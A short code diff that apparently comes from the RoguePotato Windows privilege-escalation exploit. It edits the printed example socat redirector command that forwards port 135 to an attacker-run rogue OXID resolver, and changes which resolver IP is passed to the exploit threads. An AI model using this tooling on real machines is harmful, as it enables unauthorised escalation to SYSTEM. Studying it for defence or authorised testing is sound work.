@@ -123,7 +123,7 @@ int wmain(int argc, wchar_t** argv)
 	{
 		rogueOxidResolverIp = remoteIpRelay;
 		printf("[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on %S to your victim machine on port %S\n", remoteIpRelay, rogueOxidResolverPort);
-		printf("[*] Example Network redirector: \n\tsudo socat TCP-LISTEN:135,fork,reuseaddr TCP:%S:%S\n", rogueOxidResolverIp, rogueOxidResolverPort);
+		printf("[*] Example Network redirector: \n\tsudo socat TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:%S\n", rogueOxidResolverPort);
 		juicyPotatoCompatible = false;
 	}
 
@@ -133,7 +133,7 @@ int wmain(int argc, wchar_t** argv)
 	THREAD_PARAMETERS threads_params = {};
 	threads_params.remoteIpRelay = remoteIpRelay;
 	threads_params.remotePortRelay = remotePortRelay;
-	threads_params.rogueOxidResolverIp = rogueOxidResolverIp;
+	threads_params.rogueOxidResolverIp = defaultRogueOxidResolverIp;
 	threads_params.hTTPCrossProtocolRelayPort = httpCrossProtocolrelayPort;
 	threads_params.rogueOxidResolverPort = rogueOxidResolverPort;
 
